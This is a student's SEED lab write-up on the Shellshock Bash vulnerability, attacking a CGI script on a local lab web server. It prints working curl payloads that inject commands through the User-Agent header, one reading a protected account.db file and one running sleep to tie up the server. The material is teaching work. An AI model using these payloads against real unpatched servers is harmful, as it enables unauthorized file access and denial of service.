# SEEDlabs: Shellshock Attack Lab

#### Ozgur Ural
#### Student ID: 2564455

## 1 Lab Description

On  September  24,  2014,  a  severe  vulnerability  in  Bash  was  identified.  Nicknamed  Shellshock,  this vulnerability can exploit many systems and be launched either remotely or from a local machine. In this  lab,  students  will  work  on  this  attack  to  understand  the  Shellshock  vulnerability.  The  learning objective  of  this  lab  is  for  students  to  get  a  hands-on  experience  on  this  interesting  attack, understand how it works, and reflect on the lessons learned from using this attack.


##  2 Lab Tasks

## 2.1 Environment Setup
The Bash program in Ubuntu 16.04 has already been patched, so it is no longer vulnerable to the  Shellshock  attack.  For  the  purpose  of  this  lab,  we  have  installed  a  vulnerable  version  of Bash inside the /bin folder; its name is bash shellshock. We need to use this Bash in our task. Please run this vulnerable version of Bash like the following and then design an experiment to verify whether this Bash is vulnerable to the Shellshock attack or not.

```sh
$ /bin/bash_shellshock
```

##  2.2    Task 1: Attack CGI programs
In  this  task,  we  will  launch  the  Shellshock  attack  on  a  remote  web  server.  Many  web  servers enable CGI, which is a standard method used to generate dynamic content on Web pages and Web  applications.  Many  CGI  programs  are  written  using  shell  script.  Therefore,  before  a  CGI program is executed, the shell program will be invoked first, and such an invocation is triggered by a user from a remote computer.

Set up the CGI Program. Create a very simple CGI program (called myprog.cgi) using the root account  in  folder  /usr/lib/cgi-bin/  as  the  following.  Make  this  cgi  executable  by  running  ”chmod 755 myprog.cgi”. It simply prints out "Hello, I am Shellshock!!" using shell script.

```sh
#!/bin/bash
echo "Content-type: text/plain"
echo
echo
echo "Hello, I am Shellshock!!"
```
The  above  CGI  program  in  the  /usr/lib/cgi-bin  directory  and  is  executable.  This  folder  is  the default  CGI  directory  for  the  Apache  web  server.  To  access  this  CGI  program  from  the  Web, you can either use a browser by typing the following URL: http://localhost/cgi-bin/myprog.cgi, or use the following command line program curl to do the same thing:

```sh
curl http://localhost/cgi-bin/myprog.cgi
```
I did the required steps as you can see below:

```sh
[10/13/21]seed@VM:.../cgi-bin$ vim myprog.cgi
[10/13/21]seed@VM:.../cgi-bin$ sudo su
root@VM:/usr/lib/cgi-bin# vim myprog.cgi
root@VM:/usr/lib/cgi-bin# ll
total 12
drwxr-xr-x   2 root root 4096 Oct 13 16:52 ./
drwxr-xr-x 153 root root 4096 Jun 11  2019 ../
-rw-r--r--   1 root root   87 Oct 13 16:52 myprog.cgi
root@VM:/usr/lib/cgi-bin# chmod +x myprog.cgi 
root@VM:/usr/lib/cgi-bin# curl http://localhost/cgi-bin/myprog.cgi

Hello, I am Shellshock!!
root@VM:/usr/lib/cgi-bin#
```


In our setup, we run the Web server and the attack from the same computer, and that is why we use localhost. In real attacks, the server is running on a remote machine, and instead of using localhost, we use the hostname or the IP address of the server.

### Task  1A:  
Get  Secret  Data.  After  the  above  CGI  program  is  set  up,  you  can  launch  the Shellshock attack. The attack does not depend on what is in the CGI program, as it targets the Bash program, which is invoked first, before the CGI script is executed. Your goal is to launch the  attack  through  the  URL  http://localhost/cgi-bin/myprog.cgi,  such  that  you  can  achieve something that you cannot do as a remote user. In this task, you need to create an account.db file in directory /usr/lib/cgi-bin using the root account with some random content, e.g.,“ABCDE”. As  a  regular  user  without  the  permission  of  accessing  cgi-bin  folder,  you  now  need  to  get  the content  of  account.db  via  the  Shellshock  attack.  Please  describe  how  your  attack  works.  Note that, your screenshot of successful attack is required for this task.

```sh
[10/19/21]seed@VM:.../cgi-bin$ sudo ln -sf /bin/bash_shellshock /bin/sh
10/19/21]seed@VM:.../cgi-bin$ curl -A '() { echo "hello";}; echo Content_type: text/plain; echo; /bin/cat /usr/lib/cgi-bin/account.db' http://localhost/cgi-bi>
"OZGURURALACCOUNTDB"
```
The bash is not vulnerable in the seed setup. The vulnerable bash program on the seed setup is bash_shellshock. Therefore we used the bash_shellshock. We create a database file named account.db under the /usr/lib/cgi-bin and add an entry. Then we use the vulnerability of bash_shellshock and pass an enviroment variable starting with '() {' - indication a function to the child process, using the user-agent header field of the HTTP request. The vulnerability in the bash program not only converts this enviroment variable into function, but also executes the shell commands present in the environment variable string. We could read the db file with using this vulnerability.

### Task 1B: 
Crash the Server. In this task, we want to crash the server with the Shellshock attack. This kind of attack typically happens for a deny of service. In this task, the /bin/sleep function is your best friend to use in your attack. If you are not familiar with the sleep function, you can use sleep –help for more information. Please describe how your attack works.

```sh
[10/20/21]seed@VM:.../cgi-bin$ curl -A '() { echo "hello";}; echo Content_type: text/plain; echo; /bin/sleep 20| /sbin/sleep 20|/usr/bin/sleep 20'  http://localhost/cgi-bin/myprog.cgi
```sh

It attempts to run the sleep command in three different ways (since systems have slightly different configurations, sleep might be found in the directories /bin or /sbin or /usr/bin). Whichever sleep it runs, it causes the server to wait 20 seconds before replying . That will consume resources on the machine because a thread or process executing the sleep will do nothing else for 20 seconds.

This is perhaps the simplest denial-of-service of all. The attackers simply tells the machine to sleep for a while. Send enough of those commands, and the machine could be tied up doing nothing and unable to service legitimate requests.

